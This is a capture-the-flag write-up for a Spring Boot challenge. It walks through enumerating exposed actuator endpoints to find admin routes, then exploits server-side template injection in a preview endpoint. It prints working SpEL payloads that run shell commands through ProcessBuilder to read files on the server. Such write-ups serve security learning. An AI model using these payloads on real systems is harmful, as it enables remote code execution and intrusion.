#### Sugar Heist
- points earned: 103
#### Where's the flag?
- There was no source code provided with this challenge so the flag location is unknown.
#### Notes / Intuition
- There is some information exposed in the source code of the landing page for this app
	```html
	<!-- Powered by Spring Boot 3.2.2 | H2 Database | Thymeleaf -->
	<!-- Management API: /actuator -->
	```
	- Spring Boot  framework
	- `/actuator`
- `/actuator` reveals routes for this app
	```json
	{"_links":{"self":{"href":"http://chals1.apoorvctf.xyz:7001/actuator","templated":false},"beans":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/beans","templated":false},"health-path":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/health/{*path}","templated":true},"health":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/health","templated":false},"info":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/info","templated":false},"configprops-prefix":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/configprops/{prefix}","templated":true},"configprops":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/configprops","templated":false},"env-toMatch":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/env/{toMatch}","templated":true},"env":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/env","templated":false},"metrics":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/metrics","templated":false},"metrics-requiredMetricName":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/metrics/{requiredMetricName}","templated":true},"mappings":{"href":"http://chals1.apoorvctf.xyz:7001/actuator/mappings","templated":false}}}
	```
- `/actuator/mappins` reveals more routes
	- I have everything but admin routes
	```json
	{
	  "contexts": {
	    "SweetShop": {
	      "mappings": {
	        "dispatcherServlets": {
	          "dispatcherServlet": [
	            ...,
	            {
	              "handler": "com.apoorvctf.sweetshop.controller.AdminController#listUsers(String)",
	              "predicate": "{GET [/api/admin/users]}",
	              "details": {
	                "handlerMethod": {
	                  "className": "com.apoorvctf.sweetshop.controller.AdminController",
	                  "name": "listUsers",
	                  "descriptor": "(Ljava/lang/String;)Lorg/springframework/http/ResponseEntity;"
	                },
	                "requestMappingConditions": {
	                  "consumes": [],
	                  "headers": [],
	                  "methods": ["GET"],
	                  "params": [],
	                  "patterns": ["/api/admin/users"],
	                  "produces": []
	                }
	              }
	            },
	            {
	              "handler": "com.apoorvctf.sweetshop.controller.AdminController#previewTemplate(String, Map)",
	              "predicate": "{POST [/api/admin/preview]}",
	              "details": {
	                "handlerMethod": {
	                  "className": "com.apoorvctf.sweetshop.controller.AdminController",
	                  "name": "previewTemplate",
	                  "descriptor": "(Ljava/lang/String;Ljava/util/Map;)Lorg/springframework/http/ResponseEntity;"
	                },
	                "requestMappingConditions": {
	                  "consumes": [],
	                  "headers": [],
	                  "methods": ["POST"],
	                  "params": [],
	                  "patterns": ["/api/admin/preview"],
	                  "produces": []
	                }
	              }
	            },
	            {
	              "handler": "com.apoorvctf.sweetshop.controller.AdminController#getFlag(String)",
	              "predicate": "{GET [/api/admin/flag]}",
	              "details": {
	                "handlerMethod": {
	                  "className": "com.apoorvctf.sweetshop.controller.AdminController",
	                  "name": "getFlag",
	                  "descriptor": "(Ljava/lang/String;)Lorg/springframework/http/ResponseEntity;"
	                },
	                "requestMappingConditions": {
	                  "consumes": [],
	                  "headers": [],
	                  "methods": ["GET"],
	                  "params": [],
	                  "patterns": ["/api/admin/flag"],
	                  "produces": []
	                }
	              }
	            },
	            {
	              "handler": "com.apoorvctf.sweetshop.controller.AdminController#debugConfig(String)",
	              "predicate": "{GET [/api/admin/debug/config]}",
	              "details": {
	                "handlerMethod": {
	                  "className": "com.apoorvctf.sweetshop.controller.AdminController",
	                  "name": "debugConfig",
	                  "descriptor": "(Ljava/lang/String;)Lorg/springframework/http/ResponseEntity;"
	                },
	                "requestMappingConditions": {
	                  "consumes": [],
	                  "headers": [],
	                  "methods": ["GET"],
	                  "params": [],
	                  "patterns": ["/api/admin/debug/config"],
	                  "produces": []
	                }
	              }
	            },
	            ...
	          ]
	        },
	        "servletFilters": [ ... ],
	        "servlets": [ ... ]
	      }
	    }
	  }
	}
	
	```
- Sending a POST to `/api/admin/preview` results in
	```json
	{
	    "error": "Missing 'template' field"
	}
	```
- Sending another post request to `/api/admin/preview` with JSON data `{"template":"meow"}` results in
	```json
	{
	    "note": "This is a preview of the notification template",
	    "preview": "meow"
	}
	```
- Sending another POST with an SSTI payload `{"template":"${4*4}"}` results in
	```JSON
	{
	    "note": "This is a preview of the notification template",
	    "preview": "16"
	}
	```
	- the payload was executed!!!
- I found an SSTI payload in my notes that returns user info
	```java
	${new java.lang.ProcessBuilder('sh','-c','id').start().inputReader().lines().collect(T(java.util.stream.Collectors).joining(' '))}
	```
- Now the goal is just to read the flag
```java
${new java.lang.ProcessBuilder('sh','-c','cat flag.txt').start().inputReader().lines().collect(T(java.util.stream.Collectors).joining(' '))}
```

#### Solution
- HTML comments on the landing page revea a management api
	- `<!-- Management API: /actuator -->`
- `/actuator/mappings` reviews admin routes
	- `GET [/api/admin/debug/config]`
	- `GET [/api/admin/flag]`
	- `GET [/api/admin/users]`
	- `POST [/api/admin/preview]`
- Exploit SSTI in `/api/admin/preview` to read the flag.
